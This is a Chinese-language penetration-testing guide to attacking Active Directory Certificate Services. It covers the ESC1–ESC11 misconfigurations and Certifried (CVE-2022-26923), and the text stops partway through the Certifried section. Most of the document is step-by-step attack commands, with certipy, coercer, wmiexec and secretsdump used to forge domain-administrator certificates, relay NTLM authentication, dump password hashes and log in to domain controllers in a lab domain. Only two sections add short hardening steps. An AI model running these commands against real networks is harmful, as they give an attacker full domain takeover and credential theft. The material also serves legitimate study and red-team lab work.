#  ADCS Attack Surface - ADCS攻击面

## 信息收集

### 获取证书模板以及ADCS信息

```shell
# 模板
proxychains certipy find -u <域用户>@<域名> -p <密码> -dc-ip <域控服务器IP>
# 示例
proxychains certipy find -u worker@hacker.com -p worker@123 -dc-ip 10.10.10.1
```

![info](../../images/AD/ADCS/info/1.png)

### 获取ADCS服务器域名

```shell
# 模板
grep "DNS Name" <刚才收集的信息文件名>
# 示例
grep "DNS Name" 20231229224157_Certipy.txt
```

![info](../../images/AD/ADCS/info/2.png)

### 获取CA证书颁发机构名称

```shell
# 模板
grep "CA Name" <刚才收集的信息文件名>
# 示例
grep "CA Name" 20231229224157_Certipy.txt
```

![info](../../images/AD/ADCS/info/3.png)

## 权限提升

### Template Misconfiguration - 模板配置错误

#### ESC1

##### 环境配置

- certsrv.msc打开证书颁发机构，右击证书模板 > 管理 > 右击现有的证书模板 > 复制模板（这里直接复制User模板）
- 允许认证用户对此模板进行注册

![esc1](../../images/AD/ADCS/esc1/cnd/1.png)

- 使用者名称在请求中提供

![esc1](../../images/AD/ADCS//esc1/cnd/2.png)

- 允许客户端身份验证

![esc1](../../images/AD/ADCS/esc1/cnd/3.png)

- 右击证书模板 > 新建 > 要颁发的证书模板

##### 利用条件

- 颁发CA授予低权限用户请求权限（默认）
- 模板中CA管理员审批未启用（默认）
- 模板中不需要授权的签名（默认）
- 模板允许低权限用户注册

- 使用者名称在请求中提供

- 模板定义了启用认证的EKU

##### 前期准备

- 通过find信息收集，发现名为ESC1的模板允许用户注册并且存在ESC1漏洞

![esc1](../../images/AD/ADCS/esc1/pre/1.png)

##### 攻击方法

- 申请域管理员证书模板

```shell
# 模板
proxychains certipy req -u <域用户> -p <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <漏洞证书模板> -upn <目标域用户>
# 示例
proxychains certipy req -u worker@hacker.com -p worker@123 -ca hacker-CASVR-CA -target casvr.hacker.com -template ESC1 -upn administrator@hacker.com
```

![esc1](../../images/AD/ADCS/esc1/att/1.png)

- 获取域管理员HASH

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![esc1](../../images/AD/ADCS/esc1/att/2.png)

- 远程登录域控（PS：使用codec参数值936，防止中文乱码）

```shell
# 模板
proxychains wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <目标用户哈希> -codec 936
# 示例
proxychains wmiexec.py hacker.com/administrator@dc.hacker.com -no-pass -hashes :7782c491c3a02792f0e86319b29e7a24 -codec 936
```

![esc1](../../images/AD/ADCS/esc1/att/3.png)

#### ESC2

##### ESC1（使用者名称在请求中提供）

###### 环境配置

- 允许认证用户对此模板进行注册

![esc2](../../images/AD/ADCS/esc2/esc1/cnd/1.png)

- 设置EKU为空

![esc2](../../images/AD/ADCS/esc2/esc1/cnd/2.png)

- 使用者名称在请求中提供

![esc2](../../images/AD/ADCS/esc2/esc1/cnd/3.png)

###### 利用条件

- 颁发CA授予低权限用户请求权限（默认）
- 模板中CA管理员审批未启用（默认）
- 模板中不需要授权的签名（默认）
- 模板允许低权限用户注册

- 证书模板中定义了No EKU或Any EKU

- 使用者名称在请求中提供

###### 前期准备

- 通过find信息收集，发现名为ESC2的模板允许用户注册并且存在ESC2漏洞

![esc2](../../images/AD/ADCS/esc2/esc1/pre/1.png)

###### 攻击方法

- 申请域管理员证书模板

```shell
# 模板
proxychains certipy req -u <域用户> -p <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn <目标域用户>
# 示例
proxychains certipy req -u worker@hacker.com -p worker@123 -ca hacker-CASVR-CA -target casvr.hacker.com -template ESC2 -upn administrator@hacker.com
```

![esc2](../../images/AD/ADCS/esc2/esc1/att/1.png)

##### ESC3（EKU启用证书申请代理）

###### 环境配置

- 允许认证用户对此模板进行注册

![esc2](../../images/AD/ADCS/esc2/esc3/cnd/1.png)

- 设置EKU为空

![esc2](../../images/AD/ADCS/esc2/esc3/cnd/2.png)

- 禁用电子邮件提供名称

![esc2](../../images/AD/ADCS/esc2/esc3/cnd/3.png)

###### 利用条件

- 颁发CA授予低权限用户请求权限（默认）
- 模板中CA管理员审批未启用（默认）
- 模板中不需要授权的签名（默认）
- 模板允许低权限用户注册

- 证书模板中定义了No EKU或Any EKU

- 使用者名称取消电子邮件名

###### 前期准备

- 通过find信息收集，发现名为ESC2的模板允许用户注册并且存在ESC2漏洞

![esc2](../../images/AD/ADCS/esc2/esc3/pre/1.png)

###### 攻击方法

- 申请ESC2证书模板

```shell
# 模板
proxychains certipy req -u <域用户> -p <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板>
# 示例
proxychains certipy req -u worker@hacker.com -p worker@123 -ca hacker-CASVR-CA -target casvr.hacker.com -template ESC2
```

![esc2](../../images/AD/ADCS/esc2/esc3/att/1.png)

- 通过代理证书申请目标证书（这里申请域管理员的用户证书）

```shell
# 模板
proxychains certipy req -u <域用户> -p <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -on-behalf-of <目标用户> -pfx <刚才申请的代理证书>
# 示例
proxychains certipy req -u worker@hacker.com -p worker@123 -ca hacker-CASVR-CA -target casvr.hacker.com -template User -on-behalf-of administrator -pfx worker.pfx
```

![esc2](../../images/AD/ADCS/esc2/esc3/att/2.png)

#### ESC3

##### 环境搭建

- 添加证书申请代理的EKU

![esc3](../../images/AD/ADCS/esc3/cnd/1.png)

- 允许认证用户对此模板进行注册

![esc3](../../images/AD/ADCS/esc3/cnd/2.png)

- 使用者名称禁用电子邮件

![esc3](../../images/AD/ADCS/esc3/cnd/3.png)

##### 利用条件

- 颁发CA授予低权限用户请求权限（默认）
- 模板中CA管理员审批未启用（默认）
- 模板中不需要授权的签名（默认）
- 模板允许低权限用户注册
- 证书模板中定义了证书申请代理EKU
- 使用者名称禁用电子邮件

##### 前期准备

- 通过find信息收集，发现名为ESC3的模板允许用户注册并且存在ESC3漏洞

![esc3](../../images/AD/ADCS/esc3/pre/1.png)

##### 攻击方法

- 申请ESC3证书模板

```shell
# 模板
proxychains certipy req -u <域用户> -p <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板>
# 示例
proxychains certipy req -u worker@hacker.com -p worker@123 -ca hacker-CASVR-CA -target casvr.hacker.com -template ESC3
```

![esc3](../../images/AD/ADCS/esc3/att/1.png)

- 通过代理证书申请目标证书（PS：被申请模板要满足使用者名称禁用电子邮件、模板允许低权限用户注册证书、模板中定义了客户端身份认证的EKU，这里直接申请User模板即可）

```shell
# 模板
proxychains certipy req -u <域用户> -p <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -on-behalf-of <目标用户> -pfx <刚才申请的代理证书>
# 示例
proxychains certipy req -u worker@hacker.com -p worker@123 -ca hacker-CASVR-CA -target casvr.hacker.com -template User -on-behalf-of administrator -pfx worker.pfx
```

![esc3](../../images/AD/ADCS/esc3/att/2.png)

### Access Controls Attacks - ACL安全威胁

#### ESC4

##### 环境配置

- 模板允许低权限用户注册、写入

![esc4](../../images/AD/ADCS/esc4/cnd/1.png)

- 证书模板中定义了客户端身份认证或服务器身份认证EKU

![esc4](../../images/AD/ADCS/esc4/cnd/2.png)

##### 利用条件

- 颁发CA授予低权限用户请求权限（默认）
- 模板中CA管理员审批未启用（默认）
- 模板中不需要授权的签名（默认）
- 模板允许低权限用户注册、写入
- 证书模板中定义了客户端认证EKU

##### 前期准备

- 通过find信息收集，发现名为ESC4的模板允许用户注册并且存在ESC4漏洞

![esc4](../../images/AD/ADCS/esc4/pre/1.png)

##### 攻击方法

- 使用ESC1模板覆盖ESC4模板并保存ESC4旧模板

```shell
# 模板
proxychains certipy template -u <域用户> -p <密码> -template <模板名称> -save-old
# 示例
proxychains certipy template -u worker@hacker.com -p worker@123 -template ESC4 -save-old
```

![esc4](../../images/AD/ADCS/esc4/att/1.png)

- 申请域管理员证书模板

```shell
# 模板
proxychains certipy req -u <域用户> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn <目标域用户>
# 示例
proxychains certipy req -u worker@hacker.com -p worker@123 -ca hacker-CASVR-CA -target casvr.hacker.com -template ESC4 -upn administrator@hacker.com
```

![esc4](../../images/AD/ADCS/esc4/att/2.png)

- 恢复ESC4模板

```shell
# 模板
proxychains certipy template -u <域用户> -p <密码> -template <证书模板> -configuration <证书模板配置>
# 示例
proxychains certipy template -u worker@hacker.com -p worker@123 -template ESC4 -configuration ESC4.json
```

![esc4](../../images/AD/ADCS/esc4/att/3.png)

#### ESC5

##### 利用条件

- 获取子域控权限

##### 攻击方法

- 使用psexec启动一个system权限的命令行，并打开ADSI

```shell
psexec.exe -i -s cmd
adsiedit.msc
```

- 在ADSI连接到子域的配置，添加一个账号赋予PKS完全控制属性，并继承PKS全部权限（要为system和administrator添加这个权限）

![esc5](../../images/AD/ADCS/esc5/att/1.png)

- 登录子CA，命令行输入mmc（文件→添加/删除管理单元→证书模板→添加），创建漏洞模板（这里直接创建一个ESC1模板，把所有用户权限都设置为完全控制）

![esc5](../../images/AD/ADCS/esc5/att/2.png)

- 回到子域控，打开ADSI发现模板已经同步到主域CA（这里ESC1模板我命名为ESC5）

![esc5](../../images/AD/ADCS/esc5/att/3.png)

- 修改ES，添加发布ESC5模板

![esc5](../../images/AD/ADCS/esc5/att/4.png)

- 申请根域管理员证书模板

```shell
# 模板
proxychains certipy req -u <域用户> -p <密码> -ca <根CA名称> -target <根CA服务器域名> -template <漏洞模板> -upn <根域管理员>
# 示例
proxychains certipy req -u administrator@sub.hacker.com -p subdcadmin@123 -ca hacker-CASVR-CA -target casvr.hacker.com -template ESC5 -upn administrator@hacker.com
```

![esc5](../../images/AD/ADCS/esc5/att/5.png)

#### ESC7

##### 用户拥有颁发和管理证书权限

###### 环境搭建

- 使用高权限账号为当前账号赋予"颁发和管理证书"权限

```shell
# 模板
proxychains certipy ca -ca <证书颁发机构名称> -add-officer <被授权用户名> -u <管理员> -p <密码> -dc-ip <域控服务器IP> -target <ADCS服务器IP>
# 示例
proxychains certipy ca -ca hacker-CASVR-CA -add-officer worker -u administrator@hacker.com -p dcadmin@123 -dc-ip 10.10.10.1 -target 10.10.80.1
```

![esc7](../../images\AD\ADCS\esc7\officer\cnd\1.png)

- 这里基于ESC1创建了ESC7证书模板

![esc7](../../images\AD\ADCS\esc7\officer\cnd\2.png)

###### 利用条件

- 当前用户拥有"颁发和管理证书"权限
- 存在一个可申请的证书模板，且此模板的Enrollment Flag拥有PendAllRequests值
- 此模板存在其他模板漏洞（PS：在拥有"颁发和管理证书"权限下，单纯的ESC7模板无法攻击成功）

###### 前期准备

- 查找可申请的证书模板，并且需要审核才能颁发的证书（这里Certificate Name Flag存在EnrolleeSuppliesSubject值，说明存在ESC1模板漏洞）

```shell
proxychains certipy find -u worker@hacker.com -p worker@123 -dc-ip 10.10.10.1 -enable
```

![esc7](../../images\AD\ADCS\esc7\officer\pre\1.png)

![esc7](../../images\AD\ADCS\esc7\officer\pre\2.png)

###### 攻击方法

- 申请需要PendAllRequests的证书，保存key的id

```shell
# 模板
proxychains certipy req -u <用户名>@<域名> -p <密码> -ca <CA证书机构名称> -target <ADCS服务器名称> -template <需要PendAllRequests的证书模板> -upn <域管理员账号>
# 示例
proxychains certipy req -u worker@hacker.com -p worker@123 -ca hacker-CASVR-CA -target casvr.hacker.com -template ESC7 -upn administrator@hacker.com
```

![esc7](../../images\AD\ADCS\esc7\officer\att\1.png)

- 根据key的id审核刚才申请的管理员证书

```shell
# 模板
proxychains certipy ca -ca <CA证书机构名称> -issue-request <key的id> -u <具备管理CA的用户> -p <密码> -target <ADCS服务器IP>
# 示例
proxychains certipy ca -ca hacker-CASVR-CA -issue-request 228 -u worker@hacker.com -p worker@123 -target 10.10.80.1
```

![esc7](../../images\AD\ADCS\esc7\officer\att\2.png)

- 根据刚才key的id申请域管理员证书

```shell
# 模板
proxychains certipy req -u <具备管理CA的用户> -p <密码> -ca <CA证书机构名称> -target <ADCS服务器域名> -retrieve <key的id>
# 示例
proxychains certipy req -u worker@hacker.com -p worker@123 -ca hacker-CASVR-CA -target casvr.hacker.com -retrieve 228
```

![esc7](../../images\AD\ADCS\esc7\officer\att\3.png)

##### 用户拥有管理CA权限

###### 环境搭建

- 使用高权限账号为当前账号赋予"管理CA"权限

```shell
# 模板
proxychains certipy ca -ca <证书颁发机构名称> -add-manager <被授权用户名> -u <管理员> -p <密码> -dc-ip <域控服务器IP> -target <ADCS服务器IP>
# 示例
proxychains certipy ca -ca hacker-CASVR-CA -add-manager worker -u administrator@hacker.com -p dcadmin@123 -dc-ip 10.10.10.1 -target 10.10.80.1
```

![esc7](../../images\AD\ADCS\esc7\manager\cnd\1.png)

###### 利用条件

- 拥有"管理CA权限"的权限的用户

###### 前期准备

- 查看certipy find报告发现当前账号存在CA高危权限，即ESC7

![esc7](../../images\AD\ADCS\esc7\manager\pre\1.png)

###### 攻击方法

- 使用CA管理员为当前账号赋予"颁发和管理证书"权限

```shell
# 模板
proxychains certipy ca -ca <证书颁发机构名称> -add-officer <被授权用户名> -u <管理员> -p <密码> -dc-ip <域控服务器IP> -target <ADCS服务器IP>
# 示例
proxychains certipy ca -ca hacker-CASVR-CA -add-officer worker -u worker@hacker.com -p worker@123 -dc-ip 10.10.10.1 -target 10.10.80.1
```

![esc7](../../images\AD\ADCS\esc7\manager\att\1.png)

- 启用SubCA证书模板

```shell
# 模板
proxychains certipy ca -ca <CA证书机构名称> -enable-template SubCA -u <CA管理员> -p <密码> -dc-ip <域控服务器IP> -target <ADCS服务器IP>
# 示例
proxychains certipy ca -ca hacker-CASVR-CA -enable-template SubCA -u worker@hacker.com -p worker@123 -dc-ip 10.10.10.1 -target 10.10.80.1
```

![esc7](../../images\AD\ADCS\esc7\manager\att\2.png)

- 申请域管理员证书，保存key的id

```shell
# 模板
proxychains certipy req -u <用户名>@<域名> -p <密码> -ca <CA证书机构名称> -target <ADCS服务器名称> -template SubCA -upn <域管理员账号>  -dc-ip <域控服务器IP>
# 示例
proxychains certipy req -u worker@hacker.com -p worker@123 -ca hacker-CASVR-CA -target casvr.hacker.com -template SubCA -upn administrator@hacker.com -dc-ip 10.10.10.1
```

![esc7](../../images\AD\ADCS\esc7\manager\att\3.png)

- 根据key的id审核刚才申请的管理员证书

```shell
# 模板
proxychains certipy ca -ca '<CA证书机构名称>' -issue-request <key的id> -u <具备管理CA的用户> -p <密码> -dc-ip <域控服务器IP> -target <ADCS服务器IP>
# 示例
proxychains certipy ca -ca hacker-CASVR-CA -issue-request 230 -u worker@hacker.com -p worker@123 -dc-ip 10.10.10.1 -target 10.10.80.1
```

![esc7](../../images\AD\ADCS\esc7\manager\att\4.png)

- 根据刚才key的id申请域管理员证书

```shell
# 模板
proxychains certipy req -u <具备管理CA的用户> -p <密码> -ca <CA证书机构名称> -target <ADCS服务器IP> -retrieve <key的id>
# 示例
proxychains certipy req -u worker@hacker.com -p worker@123 -ca hacker-CASVR-CA -target 10.10.80.1 -retrieve 230
```

![esc7](../../images\AD\ADCS\esc7\manager\att\5.png)

### CA Misconfiguration - 证书颁发机构错误配置

#### ESC6

##### 环境搭建

- 使用以下命令配置漏洞环境，配位完毕后要重启服务（这里修改User模板的属性）

```shell
# 模板
certutil -config "<ADCS域名>\<证书模板>" -setreg "policy\EditFlags" +EDITF_ATTRIBUTESUBJECTALTNAME2
# 示例
certutil -config "casvr.hacker.com\User" -setreg "policy\EditFlags" +EDITF_ATTRIBUTESUBJECTALTNAME2
```

![esc6](../../images/AD/ADCS/esc6/cnd/1.png)

- 重启证书服务

```shell
net stop certsvc & net start certsvc
```

##### 利用条件

- 启用EDITF_ATTRIBUTESUBJECTALTNAME2标志（即任意的证书模板允许使用者名称在请求中提供）

##### 前期准备

- 获取证书模板漏洞信息

![esc6](../../images/AD/ADCS/esc6/pre/1.png)

##### 攻击方法

- 申请域管理员证书

```shell
# 模板
proxychains certipy req -u <域用户> -p <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn <目标域用户>
# 示例
proxychains certipy req -u worker@hacker.com -p worker@123 -ca hacker-CASVR-CA -target casvr.hacker.com -template User -upn administrator@hacker.com
```

![esc6](../../images/AD/ADCS/esc6/att/1.png)

##### 防御方法

- 删除受影响模板的EDITF_ATTRIBUTESUBJECTALTNAME2标志

```shell
# 模板
certutil -config "<ADCS服务器域名>\<模板名称>" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
# 示例
certutil -config "casvr.hacker.com\User" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

![esc6](../../images/AD/ADCS/esc6/def/1.png)

- 重启证书服务

```shell
net stop certsvc & net start certsvc
```

### Relay Attacks - 中继攻击

#### ESC8

##### 利用条件

- 获取当前被控服务器的管理员权限
- CA证书服务器是开启NTLM认证

##### 前期准备

- 查看CA证书服务器是否开启NTLM认证，若返回结果为WWW-Authenticate: NTLM则开启NTLM认证

```shell
# 模板
proxychains curl <ADCS服务器>/certsrv/ -I
# 示例
proxychains curl casvr.hacker.com/certsrv/ -I
```

![esc8](../../images/AD/ADCS/esc8/pre/1.png)

- 通过find信息收集，发现CA存在ESC8漏洞

![esc8](../../images/AD/ADCS/esc8/pre/2.png)

##### 攻击方法

- 中继服务器开启监听

```shell
# 模板
proxychains certipy relay -target http://<ADCS服务器IP或域名> -template <证书模板>
# 示例
proxychains certipy relay -target http://casvr.hacker.com -template DomainController
```

![esc8](../../images/AD/ADCS/esc8/att/1.png)

- 使用强制认证漏洞

```shell
# 模板
proxychains coercer coerce -u <域用户> -p <密码> -d <域名> -l <ntlmrelayx监听终端IP> -t <目标辅域控IP>
# 示例
proxychains coercer coerce -u worker -p worker@123 -d hacker.com -l 10.10.255.1 -t 10.10.10.1
```

![esc8](../../images/AD/ADCS/esc8/att/2.png)

- 成功获取域控证书

![esc8](../../images/AD/ADCS/esc8/att/3.png)

- 获取域控票据

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx dc.pfx -dc-ip 10.10.10.1
```

![esc8](../../images/AD/ADCS/esc8/att/4.png)

- 获取域管理员哈希

```shell
# 模板
KRB5CCNAME=<TGT票据> proxychains secretsdump.py <域控服务器域名> -no-pass -k -just-dc-user <NETBIOS>/<域管理员账号> -dc-ip <域控服务器IP>
# 示例
KRB5CCNAME=dc.ccache proxychains secretsdump.py dc.hacker.com -no-pass -k -just-dc-user hacker/administrator -dc-ip 10.10.10.1
```

![esc8](../../images/AD/ADCS/esc8/att/5.png)

#### ESC11

##### 环境搭建

- 关闭IF_ENFORCEENCRYPTICERTREQUEST标志，并重启证书服务

```shell
certutil -setreg CA\InterfaceFlags -IF_ENFORCEENCRYPTICERTREQUEST
net stop certsvc & net start certsvc
```

![esc11](../../images/AD/ADCS/esc11/cnd/1.png)

##### 利用条件

- 证书颁发机构关闭IF_ENFORCEENCRYPTICERTREQUEST标志

##### 前期准备

- 通过find信息收集，发现CA存在ESC11漏洞

![esc11](../../images/AD/ADCS/esc11/pre/1.png)

##### 攻击方法

- 中继服务器开启监听

```shell
# 模板
proxychains certipy relay -target rpc://<证书服务器域名或IP> -ca <证书颁发机构名称> -template DomainController
# 示例
proxychains certipy relay -target rpc://casvr.hacker.com -ca hacker-CASVR-CA -template DomainController
```

![esc11](../../images/AD/ADCS/esc11/att/1.png)

- 使用强制认证漏洞

```shell
# 模板
proxychains coercer coerce -u <域用户> -p <密码> -d <域名> -l <ntlmrelayx监听终端IP> -t <目标辅域控IP>
# 示例
proxychains coercer coerce -u worker -p worker@123 -d hacker.com -l 10.10.255.1 -t 10.10.10.1
```

![esc11](../../images/AD/ADCS/esc11/att/2.png)

- 成功获取域控证书

![esc11](../../images/AD/ADCS/esc11/att/3.png)

##### 防御方法

- 开启IF_ENFORCEENCRYPTICERTREQUEST标志，并重启证书服务

```shell
certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
net stop certsvc & net start certsvc
```

![esc11](../../images/AD/ADCS/esc11/def/1.png)

### Extension misconfiguration - 扩展配置错误

#### ESC9 - 无安全扩展

##### 环境搭建

- 在ADCS直接复制User模板重命名为ESC9模板，并且去除要提供电子邮件名称的选项

![esc9](../../images\AD\ADCS\esc9\cnd\1.png)

- 为ESC9模板的msPKI-Enrollment-Flag属性添加CT_FLAG_NO_SECURITY_EXETENSION标志

```shell
# 模板
certutil -dstemplate "<漏洞模板名称>" msPKI-Enrollment-Flag +0x80000
# 示例
certutil -dstemplate "ESC9" msPKI-Enrollment-Flag +0x80000
```

![esc9](../../images\AD\ADCS\esc9\cnd\2.png)

- 在DC为useradmin用户添加对worker用户的GenericWrite权限

```shell
# 模板
dsacls "CN=<拥有ESC模板注册权限的用户>,CN=Users,DC=hacker,DC=com" /I:T /G <主控制用户>:GW
# 示例
dsacls "CN=worker,CN=Users,DC=hacker,DC=com" /I:T /G useradmin:GW
```

![esc9](../../images\AD\ADCS\esc9\cnd\3.png)

##### 利用条件

- 注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc的StrongCertificateBindingEnforcement未被设置为2（在KB5014754补丁之前该键不存在，但值为0）
- 证书模板msPKI-Enrollment-Flag存在标志CT_FLAG_NO_SECURITY_EXTENSION（值为0x80000）
- 模板存在客户端身份认证的EKU
- 被控账户a对任意账户b有GenericWrite权限

##### 前期准备

- 使用certipy find获取ESC9漏洞模板信息

![esc9](../../images\AD\ADCS\esc9\pre\1.png)

##### 攻击方法

- 修改被GenericWrite的用户的upn

```shell
# 模板
proxychains certipy account update -u <当前用户> -p <密码> -user <被GenericWrite的用户> -upn administrator
# 示例
proxychains certipy account update -u useradmin@hacker.com -p useradmin@123 -user worker -upn administrator
```

![esc9](../../images\AD\ADCS\esc9\att\1.png)

- 获取被GenericWrite的用户的哈希

```shell
# 模板
proxychains certipy shadow auto -u <当前用户> -p <密码> -account <被GenericWrite的用户>
# 示例
proxychains certipy shadow auto -u useradmin@hacker.com -p useradmin@123 -account worker
```

![esc9](../../images\AD\ADCS\esc9\att\2.png)

- 申请域管理员证书

```shell
# 模板
proxychains certipy req -u <被GenericWrite的用户> -hashes <哈希> -ca <证书颁发机构> -template <漏洞模板名称> -target <ADCS服务器IP>
# 示例
proxychains certipy req -u worker@hacker.com -hashes bbe3917916fd5431dd37d287072bf52b -ca hacker-CASVR-CA -template ESC9 -target 10.10.80.1
```

![esc9](../../images\AD\ADCS\esc9\att\3.png)

- 将被GenericWrite的用户恢复到原来的upn

```shell
# 模板
proxychains certipy account update -u <当前用户> -p <密码> -user <被GenericWrite的用户> -upn <被GenericWrite的用户>
# 示例
proxychains certipy account update -u useradmin@hacker.com -p useradmin@123 -user worker -upn worker@hacker.com
```

![esc9](../../images\AD\ADCS\esc9\att\4.png)

- 获取哈希

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域控IP> -domain <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -domain hacker.com
```

![esc9](../../images\AD\ADCS\esc9\att\5.png)

#### ESC10 - 弱证书映射

##### StrongCertificateBindingEnforcement打法

###### 环境搭建

- 下载并安装CVE-2022–26923补丁
- 添加注册表项

```shell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement /t REG_DWORD /d 0 /f
```

![esc10](../../images\AD\ADCS\esc10\scbe\cnd\1.png)

- 在DC为useradmin用户添加对worker用户的GenericWrite权限

![esc10](../../images\AD\ADCS\esc10\scbe\cnd\2.png)

###### 利用条件

- StrongCertificateBindingEnforcement值为0
- 存在存在客户端身份认证的EKU
- 被控账户a对任意账户b有GenericWrite权限

###### 前期准备

- 使用certipy find获取允许注册并且允许客户端身份认证的证书模板（域内默认启用User模板，而且User默认支持客户端身份认证）

###### 攻击方法

- 修改被GenericWrite的用户的upn

```shell
# 模板
proxychains certipy account update -u <当前用户> -p <密码> -user <被GenericWrite的用户> -upn administrator
# 示例
proxychains certipy account update -u useradmin@hacker.com -p useradmin@123 -user worker -upn administrator
```

![esc10](../../images\AD\ADCS\esc10\scbe\att\1.png)

- 获取被GenericWrite的用户的哈希

```shell
# 模板
proxychains certipy shadow auto -u <当前用户> -p <密码> -account <被GenericWrite的用户>
# 示例
proxychains certipy shadow auto -u useradmin@hacker.com -p useradmin@123 -account worker
```

![esc10](../../images\AD\ADCS\esc10\scbe\att\2.png)

- 申请域管理员证书（域内默认启用User模板，而且User默认支持客户端身份认证EKU，直接申请User模板即可）

```shell
# 模板
proxychains certipy req -u <被GenericWrite的用户> -hashes <哈希> -ca <证书颁发机构> -template <支持EKU的模板> -target <ADCS服务器IP>
# 示例
proxychains certipy req -u worker@hacker.com -hashes bbe3917916fd5431dd37d287072bf52b -ca hacker-CASVR-CA -template User -target 10.10.80.1
```

![esc10](../../images\AD\ADCS\esc10\scbe\att\3.png)

- 将被GenericWrite的用户恢复到原来的upn

```shell
# 模板
proxychains certipy account update -u <当前用户> -p <密码> -user <被GenericWrite的用户> -upn <被GenericWrite的用户>
# 示例
proxychains certipy account update -u useradmin@hacker.com -p useradmin@123 -user worker -upn worker@hacker.com
```

![esc10](../../images\AD\ADCS\esc10\scbe\att\4.png)

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域控IP> -domain <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -domain hacker.com
```

![esc10](../../images\AD\ADCS\esc10\scbe\att\5.png)

##### CertificateMappingMethods打法

###### 环境搭建

- 下载并安装CVE-2022–26923补丁
- 添加注册表项

```shell
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel" /v CertificateMappingMethods /t REG_DWORD /d 0x1F /f
```

![esc10](../../images\AD\ADCS\esc10\cmm\cnd\1.png)

- 在DC为useradmin用户添加对worker用户的GenericWrite权限

![esc10](../../images\AD\ADCS\esc10\cmm\cnd\2.png)

###### 利用条件

- CertificateMappingMethods值为0
- 存在允许客户端身份认证的EKU的证书模板
- 被控账户a对任意账户b有GenericWrite权限

###### 前期准备

- 使用certipy find获取允许注册并且允许客户端身份认证的证书模板（域内默认启用User模板，而且User默认支持客户端身份认证）

###### 攻击方法

- 修改被GenericWrite的用户的upn

```shell
# 模板
proxychains certipy account update -u <当前用户> -p <密码> -user <被GenericWrite的用户> -upn pdc\$@hacker.com
# 示例
proxychains certipy account update -u useradmin@hacker.com -p useradmin@123 -user worker -upn pdc\$@hacker.com
```

![esc10](../../images\AD\ADCS\esc10\cmm\att\1.png)

- 获取被GenericWrite的用户的哈希

```shell
# 模板
proxychains certipy shadow auto -u <当前用户> -p <密码> -account <被GenericWrite的用户> -dc-ip <域控IP>
# 示例
proxychains certipy shadow auto -u useradmin@hacker.com -p useradmin@123 -account worker -dc-ip 10.10.10.1
```

![esc10](../../images\AD\ADCS\esc10\cmm\att\2.png)

- 申请域管理员证书（域内默认启用User模板，而且User默认支持EKU，直接申请User模板即可）

```shell
# 模板
proxychains certipy req -u <被GenericWrite的用户> -hashes <哈希> -ca <证书颁发机构> -template <支持EKU的模板> -target <ADCS服务器IP>
# 示例
proxychains certipy req -u worker@hacker.com -hashes bbe3917916fd5431dd37d287072bf52b -ca hacker-CASVR-CA -template User -target 10.10.80.1
```

![esc10](../../images\AD\ADCS\esc10\cmm\att\3.png)

- 将被GenericWrite的用户恢复到原来的upn

```shell
# 模板
proxychains certipy account update -u <当前用户> -p <密码> -user <被GenericWrite的用户> -upn <被GenericWrite的用户>
# 示例
proxychains certipy account update -u useradmin@hacker.com -p useradmin@123 -user worker -upn worker@hacker.com
```

![esc10](../../images\AD\ADCS\esc10\cmm\att\4.png)

- 使用辅域控证书申请票据

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域控IP>
# 示例
proxychains certipy auth -pfx pdc.pfx -dc-ip 10.10.10.1
```

![esc10](../../images\AD\ADCS\esc10\cmm\att\5.png)

- 使用辅域控票据获取域管理员哈希

```shell
# 模板
KRB5CCNAME=<票据> proxychains secretsdump.py <域控> -no-pass -k -just-dc-user administrator
# 示例
KRB5CCNAME=pdc.ccache proxychains secretsdump.py dc.hacker.com -no-pass -k -just-dc-user administrator
```

![esc10](../../images\AD\ADCS\esc10\cmm\att\6.png)

### 漏洞

#### Certifried - CVE-2022–26923

##### 利用条件

- 域控安装了CA证书
- 目标服务器申请了服务器证书（域控安装了域控证书，即域控支持ldaps）

##### 环境搭建

- 在域控组策略: 计算机配置→管理模板→系统→KDC处启用对PKInit Freshness Extension的KDC支持

![cve202226923](../../images/AD/VLUN/cve202226923/cnd/1.png)

##### 前期准备

- 创建机器账号

```shell
# 模板
proxychains certipy account create  -u <域账号> -p <密码> -user <要创建的机器账号> -dns <域控域名>
# 示例
proxychains certipy account create -u worker@hacker.com -p worker@123 -user admin -dns dc.hacker.com
```

![cve202226923](../../images/AD/VLUN/cve202226923/pre/1.png)

- 使用创建的机器账号进行批量扫描

```shell
# 模板
proxychains python3 advul/main.py -ts -tf <IP列表> -u <域账号或机器账号> -p <密码> -dc-ip <域控IP> 26923
# 示例
proxychains python3 advul/main.py -ts -all-dc -u admin\$@hacker.com -p VoBqhEUlQCa2Xiu6 -dc-ip 10.10.10.1 26923
```

![cve202226923](../../images/AD/VLUN/cve202226923/pre/2.png)

- 申请域控证书

```shell
# 模板
proxychains certipy req -u <域账号> -p <密码> -ca <证书颁发机构名称> -template Machine -target-ip <ADCS服务器IP> -dc-ip <域控IP>
# 示例
